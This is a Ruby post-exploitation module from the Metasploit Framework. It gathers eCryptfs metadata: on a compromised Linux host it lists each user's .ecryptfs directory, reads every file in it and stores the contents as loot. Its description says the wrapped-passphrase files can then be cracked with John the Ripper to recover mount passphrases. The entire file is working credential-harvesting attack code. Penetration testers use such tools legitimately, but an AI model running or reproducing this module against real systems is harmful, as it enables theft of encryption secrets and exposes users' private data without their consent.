##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Unix

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Gather eCryptfs Metadata',
			'Description'    => %q{
				This module will collect the contents of all users' .ecrypts directories on
				the targeted machine. Collected "wrapped-passphrase" files can be
				cracked with John the Ripper (JtR) to recover "mount passphrases".
			},
			'License'        => MSF_LICENSE,
			'Author'         => ['Dhiru Kholia <dhiru[at]openwall.com>'],
			'Platform'       => ['linux'],
			'SessionTypes'   => ['shell']
		))
	end

	# This module is largely based on ssh_creds, gpg_creds and firefox_creds.rb.

	def run
		print_status("Finding .ecryptfs directories")
		paths = enum_user_directories.map {|d| d + "/.ecryptfs"}
		# Array#select! is only in 1.9
		paths = paths.select { |d| directory?(d) }

		if paths.nil? or paths.empty?
			print_error("No users found with a .ecryptfs directory")
			return
		end

		download_loot(paths)
	end

	def download_loot(paths)
		print_status("Looting #{paths.count} directories")
		paths.each do |path|
			path.chomp!
			sep = "/"
			files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)

			files.each do |file|
				target = "#{path}#{sep}#{file}"
				if directory?(target)
					next
				end
				print_status("Downloading #{path}#{sep}#{file} -> #{file}")
				data = read_file(target)
				file = file.split(sep).last
				loot_path = store_loot("ecryptfs.#{file}", "text/plain", session, data,
					nil, "eCryptfs #{file} File")
				print_good("File stored in: #{loot_path.to_s}")
			end
		end
	end

end
